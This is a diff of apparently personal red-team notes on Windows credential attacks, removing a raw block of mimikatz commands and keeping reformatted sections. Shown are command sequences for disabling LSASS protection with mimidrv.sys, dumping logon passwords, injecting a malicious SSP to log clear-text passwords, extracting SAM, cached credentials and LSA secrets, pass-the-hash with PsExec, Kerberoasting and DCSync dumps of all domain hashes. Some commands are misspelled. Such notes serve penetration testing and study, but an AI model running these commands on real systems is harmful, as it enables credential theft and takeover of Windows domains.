@@ -612,46 +612,6 @@
 > ```
 
 
-
-	 By Pass CG & touch Lsass :
-		`mimikatz # privilege::debug
-		`mimikatz # !+ // load mimidriv.sys
-		`mimikatz # !ping // test loaded driver 
-		`mimikatz # !bsod // blue screen
-		`mimikatz # !processprotect /process:lsass.exe /remove // remove CG
-		`mimikatz # privilege::debug
-		`mimikatz # lsadump::lsa /patch  // allow user send query to LSA for dump hash
-		`mimikatz # lsadump::lsa /inject // process create thread in SSP
-		`mimikatz # !process
-	 Dump hash touch lsass provider:
-		`mimikatz # privilege::debug
-		`mimikatz # skurlsa::
-		`mimikatz # skurlsa::msv
-		`mimikatz # skurlsa::logonpasswords // all provider 
-	 Inject SSP
-		`mimikatz # privilege::debug
-		`mimikatz # misc::memssp // load mimilib.dll in registry with kiwi name
-		`CMD > rundll32 user32.dll,LockWorkstation // lock system
-		if user lockout and login try again , he's password saved clear text in `C:\Windows\System32\mimilsa.log` this ssp that we load with me mimilib.dll 
-	Registry SAM :
-		registry SAM is protect by syskey
-	`CMD > reg save HKLM\SYSTEM system & reg save HKLM\SAM sam
-	`mimikatz # privilege::debug
-	`mimikatz # token::elevate
-	`mimikatz # lsadump::sam
-	Cache Credential 
-	reg : `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
-	`mimikatz # lsadump::cache
-	`mimikatz # lsadump::cache /user: /password: // change password
-	`mimikatz # lsadump::secrets // vpn , rdp privete key etc ...
-
-Pass The Hash ATTack
-	`mimikatz # privilege::debug
-	`mimikatz # sekurlsa::msv
-	`mimikatz # sekurlsa::pth /user: /domain:adolf.local /ntlm: /run:command
-	`CMD > PsExec.exe \\hostname cmd
-
-
 > [!info]+ Hash Dump – LSA & Credential Protection Overview
 >
 > ---
@@ -746,7 +706,6 @@ Pass The Hash ATTack
 > - WDIGEST
 >
 > They handle authentication protocols and may temporarily hold credentials in memory.
-
 
 ### Credential Guard Bypass & LSASS Interaction
 
@@ -864,8 +823,6 @@ Pass The Hash ATTack
 > - VPN credentials
 > - RDP private keys
 > - Service account secrets
-
-
 ### Pass-The-Hash Attack
 
 > [!warning]+ Pass-The-Hash (PTH)
@@ -1130,7 +1087,6 @@ Pass The Hash ATTack
 > kekeo # kerberos::ask /service:cifs/hostname.domain.local /roast /export
 > ```
 
-
 > [!danger]+ DCSync
 > DCSync is an Active Directory attack technique where the attacker impersonates a Domain Controller and requests account replication data from a legitimate DC.  
 > It allows dumping password hashes without directly accessing the Domain Controller.
@@ -1156,9 +1112,7 @@ Pass The Hash ATTack
 > ```bash
 > mimikatz # lsadump::dcsync /all
 > ```
->
 > ---
->
 > ### Dump All Users (CSV Format)
 > ```bash
 > mimikatz # lsadump::dcsync /all /csv
